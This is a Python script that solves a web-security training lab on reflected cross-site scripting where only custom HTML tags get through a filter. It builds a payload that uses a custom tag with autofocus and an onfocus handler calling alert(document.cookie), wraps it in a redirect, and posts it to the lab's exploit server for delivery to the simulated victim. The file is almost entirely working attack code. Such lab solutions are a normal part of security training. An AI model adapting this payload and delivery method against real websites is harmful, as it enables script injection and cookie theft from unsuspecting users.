##################################################################################
#
# Lab: Reflected XSS into HTML context with all tags blocked except custom ones
#
# Hack Steps: 
#      1. Craft a script that will redirect the victim to the vulnerable
#         website with the injected payload in the search query parameter
#      2. Deliver the exploit to the victim
#      3. The alert() function will be called after they trigger the exploit
#
##################################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a2c0090048c723980090d5700a3000b.web-security-academy.net"

# Change this to your exploit server URL
EXPLOIT_SERVER_URL = "https://exploit-0a2f0005044872fa80390c3c01e600a4.exploit-server.net"

def main():
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    payload = f"""<script>
                    location = "{LAB_URL}/?search=<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"
                </script>"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    print("❯❯ Delivering the exploit to the victim.. ", end="", flush=True)
    
    try:
        requests.post(EXPLOIT_SERVER_URL, data)

    except:
        print(Fore.RED + "⦗!⦘ Failed to deliver the exploit to the victim through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The alert() function will be called after they trigger the exploit") 
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()


